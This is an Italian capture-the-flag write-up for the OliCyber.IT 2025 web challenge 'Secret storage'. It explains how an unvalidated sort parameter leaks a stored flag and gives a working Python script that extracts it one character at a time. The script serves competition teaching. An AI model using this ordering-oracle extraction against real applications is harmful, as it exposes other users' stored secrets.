# OliCyber.IT 2025 - Selezione territoriale

## [web] Secret storage (23 risoluzioni)

Ho appena creato un'utilissima applicazione, che ti permette di salvare segreti.... e non vederli mai più

:)

Site: [http://secret-storage.challs.territoriali.olicyber.it](http://secret-storage.challs.territoriali.olicyber.it)

Autore: Lorenzo Leonardini <@pianka>

## Panoramica

Il sito è molto semplice, permette di creare un account, creare segreti, e visualizzare la lista di segreti. Al momento della registrazione tra i nostri segreti viene inserita la flag.

Un'altra funzionalità importante è che la lista di segreti può essere ordinata secondo diverse colonne.

## Soluzione

Il server non valida in nessun modo il campo `order` quando lo utilizza per ordinare nella query a database. Questo significa che possiamo usare il `campo` secret per ordinare e ottenere informazioni sulla flag.

Se, per esempio, inseriamo due segreti `e` e `g`, e ordiniamo per `secret`, avremo come ordine `e`, `flag`, `g`. Questo perché sappiamo che la flag inizia con `flag{`.

## Exploit

Possiamo scrivere uno script che effettua il bruteforce di un carattere alla volta per vedere come si posiziona `flag` tra i risultati. Una soluzione più ottimizzata può sfruttare una ricerca binaria.

```py
import requests
import string

flag = ''
while len(flag) == 0 or flag[-1] != '}':
    s = requests.Session()
    res = s.post(f'{URL}')

    # we use a _ in front of the characters we are testing in order to differentiate it from "flag"
    for c in string.printable[:-6]:
        res = s.post(f'{URL}', data={
            'name': f'_{flag}{c}',
            'secret': f'{flag}{c}'
        })

    content = s.get(f'{URL}?order=secret').text
    table = content.split('<tbody>')[1]
    rows = table.split('<tr>')[1:]

    index = next(i for i,v in enumerate(rows) if '>flag</td>' in v)
    flag = rows[index - 1].split('>_')[1].split('</td>')[0]

    # if it is the last char, the order might be wrong, let's see if we are at the }
    attempt = rows[index + 1].split('>_')[1].split('</td>')[0]
    if attempt[-1] == '}':
        flag = attempt

    print(flag)
```